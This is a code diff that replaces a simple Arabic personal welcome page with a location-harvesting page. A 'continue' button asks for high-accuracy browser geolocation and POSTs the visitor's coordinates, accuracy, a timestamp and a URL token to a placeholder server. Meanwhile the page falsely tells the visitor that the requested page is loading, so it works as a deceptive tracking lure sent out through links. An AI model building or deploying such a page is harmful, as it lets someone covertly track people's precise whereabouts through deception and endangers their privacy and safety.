@@ -1,37 +1,60 @@
-<!DOCTYPE html>
-<html lang="ar">
+
+<!-- save as share-location.html and host via HTTPS -->
+<!doctype html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>مرحبًا بك في موقعي</title>
-  <style>
-    body {
-      background: linear-gradient(135deg, #141E30, #243B55);
-      color: white;
-      font-family: 'Tahoma', sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    h1 {
-      font-size: 2.5em;
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 1.2em;
-      opacity: 0.9;
-    }
-    .counter {
-      margin-top: 40px;
-    }
-  </style>
+  <meta charset="utf-8" />
+  <title>اكمل الى الموقع المحدد</title>
 </head>
 <body>
-  <h1>👋 مرحبًا بك في موقعي</h1>
-  <p>سعيد بزيارتك!</p>
+  <h3>مشاركة موقعك مع صديقك</h3>
+  <p id="status">اضغط الزر للمشاركة — ستُطلب إذن تحديد الموقع من متصفحك.</p>
+  <button id="shareBtn">اضغط هنا للمتابعة</button>
 
-  <div class="counter">
-    <h3>عدد الزوار 👇</h3>
-    <img src="https://hits.sh/haithemamrah-cloud.github.io/my-website.svg?style=plastic" alt="عدد الزوار">
-  </div>
+  <script>
+    const shareBtn = document.getElementById('shareBtn');
+    const status = document.getElementById('status');
+
+    // معرّف فريد يرسله الأصدقاء لك (مثلاً: token=haithem123) تُضمّنه في الـ URL
+    // مثال: https://yourdomain.com/share-location.html?token=friendToken
+    const params = new URLSearchParams(location.search);
+    const token = params.get('token') || 'unknown';
+
+    shareBtn.onclick = async () => {
+      if (!navigator.geolocation) {
+        status.textContent = 'المتصفح لا يدعم Geolocation.';
+        return;
+      }
+
+      status.textContent = 'يتم الحصول على الموقع...';
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const payload = {
+          token,
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: new Date().toISOString()
+        };
+
+        try {
+          // عدّل الرابط إلى مسار الخادم الخاص بك
+          const resp = await fetch('https://yourserver.example.com/report-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if (resp.ok) {
+            status.textContent = 'جاري التحميل الى الصفحة المطلوبة .انتضر ارجوك.';
+          } else {
+            status.textContent = 'فشل الإرسال: ' + (await resp.text());
+          }
+        } catch (err) {
+          status.textContent = 'خطأ في الإرسال: ' + err.message;
+        }
+      }, (err) => {
+        status.textContent = 'المستخدم رفض الإذن أو حدث خطأ: ' + err.message;
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    };
+  </script>
 </body>
 </html>
